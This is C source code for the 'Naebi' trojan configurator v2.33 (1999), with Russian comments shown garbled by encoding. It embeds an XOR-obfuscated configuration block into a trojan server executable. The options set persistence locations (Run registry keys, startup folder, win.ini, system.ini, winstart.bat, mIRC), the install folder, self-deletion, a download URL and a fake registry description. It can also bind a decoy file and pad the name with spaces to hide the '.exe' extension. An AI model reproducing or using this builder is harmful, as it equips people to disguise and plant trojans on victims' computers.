   // Ðîâíÿåì ïî 8 áàéò
   #pragma pack( 8 )

   /********************************************************************/
   /*                                                                  */
   #include <direct.h>
   #include <stdio.h>
   #include <string.h>
   #include <windows.h>

   // Ñìåøåíèå â ôàéëå íà÷èíàÿ îò êîòîðîãî íà÷èíàåòñÿ êîíôèãóðàöèÿ
   #define FSIZE   0x3400

   struct ConfigFormat
   {
      unsigned long signature; // 0x73519cae

      char version; // Âåðñèÿ ïðîãðàììû 0x03 = 2.33
      // -- Ôëàãè ..
      //
      char a;
      WORD attach:1;                               // Ïðèïèñàí ëè â êîíöå ôàéë
      // - - - - - - - - - Êóäà ïèñàòüñÿ  - - - - - - - - - - - - - - - - - - - -

      WORD reg:1;                                  // LanchList
      WORD HKLM_Run:1;                             // Ïèñàòüñÿ ëè â HKLM_Run
      WORD HKLM_Runs:1;                            //
      WORD HKCU_Run:1;                             //
      WORD startup:1;                              //
      WORD win_ini:1;                              // Ïèñàòüñÿ â âèí.èíè
      WORD edial:1;                                // Â ini edialerà
      // ---- ---------- Â êàêîì ìåñòå æèòü -------------------------------------
      WORD kuda:2; //00 - system , 01 -temp , 02 - win , 03 - x3
      WORD deleteself:1; // Åñëè äà (òîëüêî åñëè åñòü ôàéë) òî ïèøåì ñåáÿ kuda íàäî
                         // À îðèãèíàëüíîãî êîíÿ âûíîñèì.

      WORD winstart:1; // Â âèíñòàðò.áàò
      WORD sys_ini:1;  // Â ñèñòåì.èíè
      WORD mirc:1;     // Ïèñàòüñÿ â Ìèðê
      // ------------------------------------------------------------------------
      //  Ïîòîì åùå ÷åãî íèòòü äîáàâëþ
      // -----
      WORD foff; //Ñìåøåíèå Ôàéëà

      char email[64];
      char id[8];         // Óíèêàëüíûé èäåíòèôèêàòîð ( nuke2000 / trojan1/ VasPupkn )
      char url[64];
      char filename[30];
      char trojname[8];  // -Êàê íàçâàòü ôàéë òðîÿíà ó æåðòâû( msWinRun,msgsrv32)
      char desc[32];    //  -Îïèñàëîâî â ðååñòðå òðîÿíà ( System ,Kernel32 etc)

   }ConfigFormat,* pConfigFormat;

   struct ConfigFormat config;

   int main (int argc,char* argv[])
   {
   char *nexe;
   char *sec,buf[0x100],buf2[0x100],ini[0x200],buf3[0x1000],attach[0x200];
   char dat[0x8000];
   char *ini1 = "config.ini";
   int i,j,k;
   SYSTEMTIME st;
   FILE* h_f;
   FILE* h_f1;
   char dot=0;
       printf(
           "   ==========================================================\n"
           "   =                 Haebu  Coceda  configurator            =\n"
           "   =                                                        =\n"
           "   =              1999     Dr.Null (L)                      =\n"
           "   =                                                        =\n"
           "   =                           http://naebi.tsx.org         =\n"
           "   =   v 2.33                  http://xbx.ipc.ru/naebi      =\n"
           "   =                           http://www.astalavista.ru/ns =\n"
           "   = 2and30@iname.com                                       =\n"
           "   ==========================================================\n");
       if (argc<2) {
           printf("\nUsage: config Naebi-Server.exe [attached-file.jpg] \n");
           return -1;
       };



       char *exe = argv[1];



       //Îòêðûâàåì ýêçåøíèê
       h_f = fopen(exe,"r+b");
       if (!h_f) {
           printf("Error: cannot open file %s\n",exe);
           return -1;
       };
       //åãî äëèíà?


   //  fseek(h_f,0,SEEK_END);
   //  f_s = ftell(h_f);
   fclose(h_f);

   memset(&config,0,sizeof(struct ConfigFormat));

   GetCurrentDirectory(0x100,buf);

   if(argc>2)
   {
       char d1[0x200];
       strncpy(d1,argv[2],255);
       nexe = strrchr(d1,'\\')?strrchr(d1,'\\')+1:d1   ;
       printf("Subname : %s\n" ,nexe);



     h_f1 = fopen(argv[2],"rb");
     if(h_f1!=0)
     {
     config.attach = 1;
     strncpy(config.filename,nexe,30);
     }
   }


   sprintf(ini,"%s\\%s",buf,ini1);
   printf(" - %s -\n",ini);


   //----------------------ãðóçèì äàòó èç ini ôàéëà----------------------
       config.signature = 0x73519cae;
       sec = "main";

       config.HKLM_Run  = GetPrivateProfileInt(sec,"HKLM_Run",0,ini);
       config.HKLM_Runs = GetPrivateProfileInt(sec,"HKLM_Runs",0,ini);
       config.HKCU_Run  = GetPrivateProfileInt(sec,"HKCU_Run",0,ini);
       config.startup   = GetPrivateProfileInt(sec,"startup",0,ini);
       config.win_ini   = GetPrivateProfileInt(sec,"win_ini",0,ini);
       config.reg       = GetPrivateProfileInt(sec,"reg",1,ini);
       config.edial     = GetPrivateProfileInt(sec,"edial",0,ini);

       // Êóäà åùå ïèñàòüñÿ -- ïðèñûëàéòå ñâîè ìåñòà
       //Íàåáè ñàìûé õóé-îòüåáåøüñÿ òðîÿí Êæå-Êõå :)
       config.sys_ini   = GetPrivateProfileInt(sec,"sys_ini",0,ini);
       config.winstart  = GetPrivateProfileInt(sec,"Write2Winstart",1,ini);
       config.mirc      = GetPrivateProfileInt(sec,"Write2Mirc",0,ini);

       config.deleteself  = GetPrivateProfileInt(sec,"deleteself",1,ini);

       config.version = 0x03; // 2.33

       config.kuda     = GetPrivateProfileInt(sec,"kuda",0,ini);


       // - Êàê ìû íàçûâàåìñÿ?
       GetPrivateProfileString(sec,"id"," txt ",config.id,8,ini);
       // - Êàêîå ÓÐË çàêà÷èâàòü (äëÿ îáíîâëåíèÿ èëè ïðîñòî ÁÎ êàêîå íèáóäü..)
       GetPrivateProfileString(sec,"url",0,config.url,64,ini);
      //  - Êàêîå èìÿ ó òðîÿíà?  ÷òî-òî.exe
       GetPrivateProfileString(sec,"trojname",0,config.trojname,8,ini);
      //  - Îïèñàíèå â ðååñòðå..
       GetPrivateProfileString(sec,"desc",0,config.desc,32,ini);
      // - Ìûëî?
       GetPrivateProfileString(sec,"email","dr-n00ll@null.ru",config.email,64,ini);






   _mkdir("InFeCteD");




   if(config.attach){
       if(strstr(argv[2],".exe"))
       {
        sprintf(buf3,"InFeCteD\\%s",nexe);
           }
       else
       {
         sprintf(buf3,"InFeCteD\\%s%50s%50s%50s%40s.exe",nexe," "," "," "," ");
       }

   }
   else
   {
   sprintf(buf3,"InFeCteD\\Trojan33.exe");
   }
   //Êîïèðóåì Kîíÿ äëÿ êîíôèãóðåíèÿ â Infected
   printf("Copy:  exe = %s  --> buf3=%s\n",exe,buf3);
   CopyFile(exe,buf3,FALSE);

   //printf("here1\n");

   h_f = fopen(buf3,"r+b");
   if(h_f==0){
       printf("Cannot open resulting file for write config data \n");
       return -1;
   }

       //ïèøåì â ýêçåøíèê

       j = FSIZE + sizeof(struct ConfigFormat);
   // ???
       config.foff = j;
       printf(" sizeof of Config: %d foff %d \n" ,sizeof(ConfigFormat),config.foff);



       fseek(h_f,FSIZE,SEEK_SET);




     printf("Write config at : %d\n",ftell(h_f));
      char * uk = (char *)&config;

       // Ïðèìèòèâíåéøèé crypt
       for(k=0;k<sizeof(ConfigFormat);k++) uk[k] ^= 0x80;


       fwrite(&config,1,sizeof(config),h_f);

       // Íàì îïÿòü íóæíû íåçàêðèïòîâàííûå íàñòðîéêè
       for(k=0;k<sizeof(ConfigFormat);k++) uk[k] ^= 0x80;

       //Åñëè ïðèïèñàí Ôàéë
       if(config.attach){

         // Ïîçèöèîíèðóåì ïîñëå êîíôèãà
           fseek(h_f,j,SEEK_SET);

           printf("Writing attached file at: %d",j);

       while(!feof(h_f1)){
            dot=fgetc(h_f1);
            fputc(dot,h_f);
              }

       }

       fclose(h_f);
       printf("Data was loaded from %s\n"
              "Executable is %s\n",
              ini,buf3);
       return 0;
   };
